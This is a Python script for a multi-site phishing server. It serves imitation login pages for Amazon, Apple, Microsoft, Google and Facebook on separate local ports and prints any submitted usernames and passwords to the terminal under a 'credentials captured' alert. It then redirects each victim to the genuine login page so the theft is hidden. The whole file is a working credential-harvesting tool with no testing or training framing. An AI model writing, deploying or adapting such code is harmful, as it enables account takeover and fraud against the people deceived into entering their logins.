import http.server
import socketserver
import threading
import urllib.parse
import os

# Configuration: Port -> (Site Name, Real Login URL)
SITES = {
    8080: ("Amazon", "https://www.amazon.com/ap/signin"),
    8081: ("Apple", "https://appleid.apple.com/sign-in"),
    8082: ("Microsoft", "https://login.microsoftonline.com"),
    8083: ("Google", "https://accounts.google.com/signin"),
    8084: ("Login", "https://www.facebook.com/login")
}

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        port = self.server.server_address[1]
        site_data = SITES.get(port)
        
        if not site_data:
            self.send_error(404)
            return

        site_name = site_data[0]
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        template_file = f"{site_name.lower()}.html"
        template_path = os.path.join(BASE_DIR, template_file)
        
        try:
            with open(template_path, "r") as f:
                content = f.read()
                self.wfile.write(content.encode())
        except Exception:
            self.wfile.write(f"<h1>{site_name} Login</h1><p>Template not found.</p>".encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)
        
        port = self.server.server_address[1]
        site_data = SITES.get(port, ("Unknown", "https://google.com"))
        site_name, real_url = site_data
        
        # --- TERMINAL LOGGING ---
        print(f"\n\033[91m[!] ALERT: CREDENTIALS CAPTURED FROM {site_name.upper()}\033[0m")
        print(f"    Source Port: {port}")
        for key, value in parsed_data.items():
            print(f"    {key.capitalize()}: {value[0]}")
        print("\033[91m" + "-"*40 + "\033[0m")

        # --- REDIRECTION ---
        self.send_response(302)
        self.send_header('Location', real_url)
        self.end_headers()

def run_server(port):
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", port), PhishingHandler) as httpd:
        site_name = SITES[port][0]
        print(f"[+] {site_name} Phishing Page: http://localhost:{port}")
        httpd.serve_forever()

if __name__ == "__main__":
    print("\n\033[93m[*] MULTI-SITE PHISHING SERVER ACTIVE\033[0m")
    print("[*] Captured credentials will appear below in red.\n")
    
    threads = []
    for port in SITES:
        t = threading.Thread(target=run_server, args=(port,), daemon=True)
        t.start()
        threads.append(t)
    
    try:
        import time
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down servers...")
